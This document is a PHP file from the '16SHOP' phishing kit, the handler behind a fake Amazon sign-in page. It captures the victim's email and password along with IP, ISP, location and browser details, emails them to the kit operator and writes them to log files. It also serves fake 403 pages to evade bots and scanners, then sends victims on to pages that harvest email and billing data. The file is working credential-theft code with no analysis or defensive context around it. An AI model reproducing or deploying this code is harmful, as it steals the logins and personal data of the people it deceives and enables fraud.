<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once('../session.php');
$ip = getUserIP();
function load_dispose() {
    $data = file_get_contents("../security/dispose.dat");
    if(strcasecmp(substr(PHP_OS, 0, 3), 'WIN') == 0){
    $data = explode("\r\n", $data);
  }else{
    $data = explode("\n", $data);
  }
    return $data;
}
if(strlen($_POST['emailLogin']) < 6) {
  tulis_file("../security/onetime.dat","$ip");
header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

if($_POST['emailLogin'] == "") {
  tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['passwordLogin'] == "") {
  echo "<script type='text/javascript'>window.top.location='../ap/signin?session=$key&pass=1&email=".$_POST['emailLogin']."';</script>";
  exit();
}

$disposeemail = load_dispose();
foreach ($disposeemail as $emailbot) {
      if (substr_count($_POST['emailLogin'], $emailbot) > 0) {
          tulis_file("../security/onetime.dat","$ip");
          header('HTTP/1.0 403 Forbidden');
          die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
        }
}

$ispuser = getisp($ip);
$message  = "#--------------------[ 16SHOP - AMAZON LOGIN ]-------------------------#\n";
$message .= "Amazon		: ".$_POST['emailLogin']."\n";
$message .= "Password		: ".$_POST['passwordLogin']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ NEW SCAMA ]-----------------------------#\n";

$_SESSION['email'] = $_POST['emailLogin'];
$_SESSION['password'] = $_POST['passwordLogin'];
if($setting['send_login'] == 'on') {
  $subject = "AMAZON LOGIN: ".$_POST['user']." [ $cn - $os - $ip ]";
  kirim_mail($setting['email_result'], "Amazon Login", $subject, $message);
}
tulis_file("../result/total_login.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Amazon");
if($setting['get_email'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/email?session=$key';</script>";
exit();
}else{
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
}
?>
